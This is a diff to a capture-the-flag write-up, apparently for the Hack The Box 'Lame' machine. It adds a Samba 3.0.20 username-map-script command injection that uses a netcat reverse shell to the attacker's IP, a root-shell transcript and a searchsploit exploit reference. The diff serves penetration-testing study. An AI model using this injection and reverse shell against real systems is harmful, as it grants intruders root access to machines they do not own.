@@ -282,12 +282,40 @@ listening on [any] 1337 ...
 
 And then reverse shell
 ```
-smb: \> logon “/='nc 10.10.14.15 1337 -e /bin/bash'
+$ smbclient //10.10.10.3/tmp                                                                                                                      127 ⨯
+Enter WORKGROUP\kali's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.15 1337`"
+Password: 
+session setup failed: NT_STATUS_IO_TIMEOUT
+smb: \>
+```
+And we get root:
+```
+$ nc -nvlp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 39486
+whoami
+root
+ls -al /root/root.txt
+-rw------- 1 root root 33 Oct  4 14:43 /root/root.txt
 ```
 
-While there are walkthroughs that open a shell (for example https://medium.com/@siddharth.singhal1995/htb-walkthrough-lame-1-caa8d4b4da39), at this time it did not work.
+There were lots of different variations of the commands, the one that I found useful was: https://0xdf.gitlab.io/2020/04/07/htb-lame.html
 
 #### Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
+
+```
+ searchsploit -m exploits/unix/remote/16320.rb                                                                                                                                           1 ⨯
+  Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/16320
+     Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
+File Type: Ruby script, ASCII text
+
+Copied to: /home/kali/Documents/github/16320.rb
+
+```
 
 macha97 has kindly created an exploit that we can use: https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py
 
@@ -371,4 +399,6 @@ msf6 exploit(multi/samba/usermap_script) > run
 whoami
 root
 ```
+
+TODO: Port 3632 exploitation
 
